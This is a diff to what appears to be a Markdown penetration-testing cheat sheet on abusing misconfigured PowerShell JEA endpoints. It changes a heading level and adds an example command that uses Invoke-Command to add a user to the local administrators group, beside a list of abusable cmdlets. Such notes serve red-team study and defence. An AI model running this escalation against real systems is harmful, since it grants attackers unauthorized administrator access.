@@ -270,7 +270,7 @@ Get-PSSessionconfiguration
 Get-PSSessionCapability -ConfigurationName <NAME> -Username <DOMAIN>\<USERNAME>
 ```
 
-#### Abuse JEA
+### Abuse JEA
 - Only when its misconfigured and allows dangerous commands like net.exe or cmdlets like Start-Process or Start-Service.
 - Allows the use of wildcard.
 - Check which commands are allowed to run and google for abuses
@@ -291,6 +291,8 @@ Add-ADGroupMember, Add-LocalGroupMember, net.exe, dsadd.exe
 ```
 Start-Process, New-Service, Invoke-Item, Invoke-WmiMethod, Invoke-Command,
 New-ScheduledTask, Register-ScheduledJob
+
+Invoke-Command -ScriptBlock {net localgroup administrators <USER> /add}
 ```
 
 ### Abuse - Set-PSSessionConfiguration
